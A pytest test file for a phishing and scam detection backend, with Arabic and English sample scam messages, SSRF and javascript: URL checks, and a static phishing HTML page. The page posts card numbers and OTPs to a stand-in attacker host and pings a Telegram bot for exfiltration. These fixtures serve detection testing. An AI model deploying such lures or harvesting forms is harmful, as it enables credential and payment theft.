"""10 pytest test cases (5 scams, 5 normal messages) for backend/analyzer.py."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from academic_analyzer import analyze_academic_text, scan_dlp_content  # noqa: E402
from analyzer import analyze_batch, analyze_message  # noqa: E402
from blockchain import issue_certificate, verify_certificate, verify_chain_integrity  # noqa: E402
from quiz import get_quiz_scenarios, verify_quiz_answer  # noqa: E402
from saas_sandbox import (  # noqa: E402
    calculate_saas_economics,
    delete_saas_tenant,
    register_saas_tenant,
    run_sandbox_benchmark,
)
from url_inspector import defang_url, inspect_url_forensics, probe_url_live  # noqa: E402
from url_sandbox import detonate_url_in_sandbox, inspect_html_payload  # noqa: E402


# --- 5 Scam Messages ---


def test_scam_prize_paypal_otp():
    msg = "مبروك! ربحت 5000$، اضغط الرابط خلال 24 ساعة http://paypa1-secure.xyz/login وأرسل رمز التحقق"
    res = analyze_message(msg)
    assert res["verdict"] == "dangerous"
    assert res["score"] >= 65
    assert len(res["reasons"]) >= 4
    assert res["category"] in {"fake_prize", "otp_theft"}
    assert len(res["highlights"]) >= 3
    assert len(res["url_forensics"]) == 1
    assert res["url_forensics"][0]["matched_brand"] == "PayPal"
    assert res["url_forensics"][0]["is_official_brand"] is False


def test_scam_bank_impersonation_zaincash():
    msg = "عزيزي العميل، سيتم إيقاف حسابك في زين كاش فوراً، يرجى تحديث بيانات البطاقة عبر http://zainca5h-update.top/auth"
    res = analyze_message(msg)
    assert res["verdict"] == "dangerous"
    assert res["score"] >= 65
    assert any(r["id"] == "brand_impersonation" for r in res["reasons"])
    assert any(r["id"] == "sensitive_data" for r in res["reasons"])


def test_scam_fake_delivery_customs():
    msg = "تعذر التسليم: طردك محتجز لوجود رسوم جمركية بسيطة، ادفع عبر bit.ly/3x9demo خلال 24 ساعة"
    res = analyze_message(msg)
    assert res["verdict"] in {"suspicious", "dangerous"}
    assert res["score"] >= 30
    assert res["category"] == "fake_delivery"


def test_scam_raw_ip_and_otp_english():
    msg = "URGENT ACTION: Your Microsoft account will be suspended! Verify your password and OTP at http://192.168.44.10/login!!!"
    res = analyze_message(msg)
    assert res["verdict"] == "dangerous"
    assert res["score"] >= 65
    assert any(r["id"] == "raw_ip_url" for r in res["reasons"])
    assert res["category"] == "otp_theft"


def test_scam_investment_guaranteed_profit():
    msg = "فرصة استثمارية: ربح يومي مضمون 300$ يومياً! حول مبلغ 50$ الآن أو أرسل بطاقة هدايا عبر https://quick-cash.click"
    res = analyze_message(msg)
    assert res["verdict"] == "dangerous"
    assert res["score"] >= 65
    assert res["category"] in {"investment_fraud", "phishing_bank"}


# --- 5 Normal Messages ---


def test_normal_arabic_friend_chat():
    msg = "وين وصلت؟ نشوفك بعد الدوام"
    res = analyze_message(msg)
    assert res["verdict"] == "safe"
    assert res["score"] < 15
    assert res["reasons"] == []


def test_normal_family_dinner_message():
    msg = "السلام عليكم، لا تنسى تجيب خبز ولبن وياك بالطريق للبيت"
    res = analyze_message(msg)
    assert res["verdict"] == "safe"
    assert res["score"] < 15


def test_normal_official_paypal_link():
    msg = "تقدر تراجع تفاصيل الفاتورة من حسابك الرسمي في https://www.paypal.com/activity"
    res = analyze_message(msg)
    assert res["verdict"] == "safe"
    assert res["score"] < 30
    assert not any(r["id"] == "brand_impersonation" for r in res["reasons"])


def test_normal_english_meeting_reminder():
    msg = "Hey team, let's meet at 3pm in the main conference room to review the quarterly slides."
    res = analyze_message(msg)
    assert res["verdict"] == "safe"
    assert res["score"] == 0


def test_normal_work_update_arabic():
    msg = "تم إرسال التقرير الشهري عبر البريد الرسمي للشركة، شكراً لجهودكم جميعاً."
    res = analyze_message(msg)
    assert res["verdict"] == "safe"
    assert res["score"] < 15


# --- New Python Features Tests ---


def test_url_forensics_defang_and_ssrf_guard():
    forensics = inspect_url_forensics("https://paypa1-secure.xyz/login?utm_source=wa&redirect=https://evil.com")
    assert forensics["defanged_url"].startswith("hxxps://paypa1-secure[.]xyz/")
    assert "utm_source" in forensics["tracking_params_removed"]
    assert "redirect" in forensics["suspicious_params"]
    assert "utm_source" not in forensics["sanitized_url"]
    assert defang_url("http://192.168.1.1/admin") == "hxxp://192[.]168[.]1[.]1/admin"

    # SSRF guard blocks private IPs
    ssrf_check = probe_url_live("http://127.0.0.1:8080/secret")
    assert ssrf_check["dns"]["resolved"] is False
    assert "Blocked" in (ssrf_check["dns"]["error"] or "")


def test_obfuscation_and_batch_analysis():
    batch = analyze_batch([
        "مرحبـــا، أرسل رمـــز التحقـــق فوراً عبر http://zainca5h.xyz",
        "صباح الخير، هل الاجتماع اليوم؟",
    ])
    assert batch["total"] == 2
    assert batch["dangerous_count"] == 1
    assert batch["safe_count"] == 1
    top_reasons = batch["items"][0]["result"]["reasons"]
    assert any(r["id"] == "text_obfuscation" for r in top_reasons)


def test_quiz_scenarios_and_verify():
    scenarios = get_quiz_scenarios()
    assert len(scenarios) == 20, f"Expected 20 scenarios, got {len(scenarios)}"
    assert "is_scam" not in scenarios[0]

    for item in scenarios:
        res_yes = verify_quiz_answer(item["id"], True, "ar")
        res_no = verify_quiz_answer(item["id"], False, "en")
        assert res_yes["correct"] != res_no["correct"]
        expected_scam = res_yes["is_scam"]

        # Verify Python analyzer scores match ground truth in both languages
        ar_score = res_yes["analysis"]["score"]
        en_score = res_no["analysis"]["score"]
        if expected_scam:
            assert ar_score >= 30, f"{item['id']} AR score too low: {ar_score}"
            assert en_score >= 30, f"{item['id']} EN score too low: {en_score}"
        else:
            assert ar_score < 30, f"{item['id']} AR false positive: {ar_score}"
            assert en_score < 30, f"{item['id']} EN false positive: {en_score}"


def test_academic_ai_plagiarism_and_behavior():
    ai_essay = (
        "مما لا شك فيه أن الذكاء الاصطناعي يلعب دوراً حيوياً في عصرنا الحالي. "
        "علاوة على ذلك، تجدر الإشارة إلى أهمية توطين التكنولوجيا في الجامعات. "
        "في الختام، بناءً على ما سبق يمكن القول إن هذا المجال واعد جداً."
    )
    res_ai = analyze_academic_text(
        ai_essay,
        behavior={"keystrokes": 5, "pasted_chars": len(ai_essay), "total_chars": len(ai_essay), "interval_std_ms": 0},
    )
    assert res_ai["ai_probability"] >= 50
    assert res_ai["behavior"]["status"] == "bulk_pasted"

    # Plagiarism overlap against custom reference
    ref = "يعتمد النظام على تحليل البصمة الرقمية للروابط وكشف الانتحال في النصوص الأكاديمية بدقة عالية."
    res_plag = analyze_academic_text(ref, reference_text=ref)
    assert res_plag["plagiarism_pct"] >= 80
    assert res_plag["originality_score"] < 50


def test_dlp_scanner_masks_secrets():
    sample = "Student export: email=student@uotechnology.edu.iq phone=+9647701234567 key=sk-FakeTestToken00000000000000000"
    res = scan_dlp_content(sample)
    assert len(res["dlp_findings"]) >= 3
    ids = {f["id"] for f in res["dlp_findings"]}
    assert "api_key" in ids
    assert "iraq_phone" in ids
    assert "email_pii" in ids


def test_blockchain_certificate_chain():
    import tempfile
    import os

    fd, temp_db = tempfile.mkstemp(suffix=".db")
    os.close(fd)
    try:
        cert = issue_certificate(
            title="Intelligent Phishing Defense",
            author="Hydar Najah",
            institution="University of Technology",
            text="Original research paper content analyzing Iraqi banking phishing trends.",
            originality_score=92,
            db_path=temp_db,
        )
        assert cert["cert_id"].startswith("ACAD-0001-")
        assert len(cert["block_hash"]) == 64
        verified = verify_certificate(cert["cert_id"], db_path=temp_db)
        assert verified["found"] is True
        assert verified["hash_valid"] is True
        assert verified["chain_valid"] is True
        assert verify_chain_integrity(db_path=temp_db) is True
    finally:
        if os.path.exists(temp_db):
            os.remove(temp_db)


def test_sandbox_benchmark_and_saas_tenants():
    import os
    import tempfile

    fd, temp_db = tempfile.mkstemp(suffix=".db")
    os.close(fd)
    try:
        bench = run_sandbox_benchmark(
            department="University of Technology — Cybersecurity",
            load_size=12,
            db_path=temp_db,
        )
        assert bench["run"]["load_size"] == 36
        assert bench["run"]["throughput_per_sec"] > 0
        assert bench["run"]["cyber_threats_caught"] >= 4
        assert len(bench["history"]) == 1

        econ = calculate_saas_economics(10000, 350, "campus")
        assert econ["savings_pct"] >= 80
        assert econ["annual_savings_usd"] > 100000

        reg = register_saas_tenant(
            university_name="الجامعة التكنولوجية",
            student_count=12000,
            faculty_count=500,
            plan_tier="campus",
            db_path=temp_db,
        )
        assert reg["summary"]["tenant_count"] == 1
        code = reg["tenants"][0]["tenant_code"]
        assert code.startswith("IQ-UNI-")
        assert reg["tenants"][0]["api_key_prefix"].startswith("acad_live_")

        after_del = delete_saas_tenant(code, db_path=temp_db)
        assert after_del["summary"]["tenant_count"] == 0
    finally:
        if os.path.exists(temp_db):
            os.remove(temp_db)


def test_url_sandbox_detonation_and_guards():
    # 1. Blocks dangerous javascript: scheme
    js_res = detonate_url_in_sandbox("javascript:alert(document.cookie)")
    assert js_res["execution_mode"] == "blocked_unsafe_scheme"
    assert js_res["verdict"] == "dangerous"
    assert js_res["safety_guarantees"]["js_executed"] is False

    # 2. Blocks SSRF targeting loopback/LAN
    ssrf_res = detonate_url_in_sandbox("http://127.0.0.1:8080/internal-admin")
    assert ssrf_res["execution_mode"] == "blocked_ssrf"
    assert ssrf_res["verdict"] == "dangerous"

    # 3. Static HTML/JS phishing payload inspection (no execution)
    phishing_html = """
    <html><head><title>Rafidain Secure Verify</title>
    <meta http-equiv="refresh" content="0;url=https://evil-stealer.xyz/done"></head>
    <body>
      <form action="https://attacker-collect.top/steal" method="POST">
        <input type="text" name="card_number" placeholder="Card Number" />
        <input type="password" name="otp_pin" />
      </form>
      <iframe src="https://tracker.xyz/pixel" style="display:none"></iframe>
      <script>
        var x = atob("dGVzdA==");
        fetch("https://api.telegram.org/bot12345/sendMessage");
      </script>
    </body></html>
    """
    dom = inspect_html_payload(phishing_html, "http://rafidain-verify.xyz/login")
    assert dom["page_title"] == "Rafidain Secure Verify"
    assert dom["forms_count"] == 1
    assert dom["password_inputs"] == 1
    assert dom["cross_domain_form"] is True
    assert dom["exfil_webhook_detected"] is True
    assert dom["obfuscated_js_hits"] >= 1
    assert dom["hidden_iframes_count"] == 1
    assert "hxxps://evil-stealer[.]xyz" in (dom["meta_refresh_target"] or "")

    # 4. Predictive offline simulation + APK download detection
    apk_res = detonate_url_in_sandbox("http://paypa1-secure.xyz/download/security-patch.apk")
    assert apk_res["verdict"] == "dangerous"
    ids = {a["id"] for a in apk_res["what_it_tries_to_do"]}
    assert "drive_by_download" in ids
    assert "predicted_brand_phish" in ids


if __name__ == "__main__":
    tests = [
        test_scam_prize_paypal_otp,
        test_scam_bank_impersonation_zaincash,
        test_scam_fake_delivery_customs,
        test_scam_raw_ip_and_otp_english,
        test_scam_investment_guaranteed_profit,
        test_normal_arabic_friend_chat,
        test_normal_family_dinner_message,
        test_normal_official_paypal_link,
        test_normal_english_meeting_reminder,
        test_normal_work_update_arabic,
        test_url_forensics_defang_and_ssrf_guard,
        test_obfuscation_and_batch_analysis,
        test_quiz_scenarios_and_verify,
        test_academic_ai_plagiarism_and_behavior,
        test_dlp_scanner_masks_secrets,
        test_blockchain_certificate_chain,
        test_sandbox_benchmark_and_saas_tenants,
        test_url_sandbox_detonation_and_guards,
    ]
    for fn in tests:
        fn()
        print(f"PASS: {fn.__name__}")
    print(f"All {len(tests)} tests passed.")
